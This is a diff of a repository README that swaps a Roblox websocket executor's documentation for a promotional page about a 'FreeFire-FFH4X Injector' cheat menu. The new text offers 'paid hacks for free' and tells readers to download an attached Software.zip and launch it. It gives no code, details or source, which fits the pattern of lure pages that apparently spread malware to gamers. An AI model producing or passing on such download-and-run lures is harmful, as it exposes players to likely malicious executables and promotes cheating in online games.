@@ -1,28 +1,31 @@
-# Roblox Websocket Executor
+# FreeFire-FFH4X Injector: MOD Menu for Free Fire
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+Welcome to the FreeFire-FFH4X Injector repository! This MOD menu provides Free Fire players with a range of amazing features to enhance their gaming experience. Whether you're looking for paid hacks for free or advanced customization options, the FFH4X Injector has got you covered. Let's dive into the details of this powerful tool.
 
-## How to use
+## Features
+- **Versatile Hacks:** Unlock paid hacks for Free Fire without any cost.
+- **Customization:** Customize Free Fire to suit your preferences.
+- **Enhanced Gameplay:** Enjoy a variety of features to take your gaming to the next level.
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+## Installation
+To get started with the FFH4X Injector, download the software from the following link:
+[![Download FFH4X Injector](https://img.shields.io/badge/Download-FFH4X_Injector-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+*Note: The provided link needs to be launched.*
 
-### Demonstration
+## Usage
+1. Download the software from the link above.
+2. Launch the FFH4X Injector.
+3. Customize your Free Fire gameplay with the available features.
+4. Enjoy an enhanced gaming experience with the MOD menu.
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+## Updates
+Stay tuned for new updates to the FFH4X Injector. We are constantly working on adding exciting new features to elevate your Free Fire gameplay. Make sure to check the "Releases" section for the latest updates and improvements.
 
-## Further explanation
+## Support
+If you encounter any issues with the FFH4X Injector or have any questions about its features, feel free to reach out to our support team. We are here to assist you in maximizing your Free Fire gaming experience using this powerful MOD menu.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+## Disclaimer
+Please note that the FFH4X Injector is intended for educational and entertainment purposes only. The use of hacks in online games may violate the terms of service of the respective game. Proceed with caution and use the MOD menu responsibly.
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
-
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
-
-## Attribution
-
-Here are a list of open-source libraries used by this project.
-
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+Get ready to take your Free Fire gameplay to a whole new level with the FFH4X Injector. Download now and start exploring the exciting features offered by this powerful MOD menu. Enjoy a customized and enhanced gaming experience like never before!
